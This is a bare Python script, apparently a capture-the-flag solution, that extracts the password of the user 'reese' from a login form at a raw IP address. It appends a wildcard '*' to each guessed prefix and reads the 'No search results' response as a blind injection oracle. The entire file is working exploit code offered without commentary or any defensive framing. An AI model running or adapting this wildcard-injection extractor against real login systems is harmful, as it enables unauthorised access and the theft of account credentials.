import requests
import string

lis = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_']

# BRUTE FORCE

url = "http://134.209.23.209:32612/login"

params = {'username': 'reese', 'password': 'someval'}

password = ''

triger = 1

while triger == 1:
    triger = 0
    for letter in lis:
        params['password'] = password + letter + '*'
        r = requests.post(url=url, data=params)
        if ('No search results' in r.text):
            password += letter
            triger = 1
            print('letter is : ',password)
            break
print('complete')
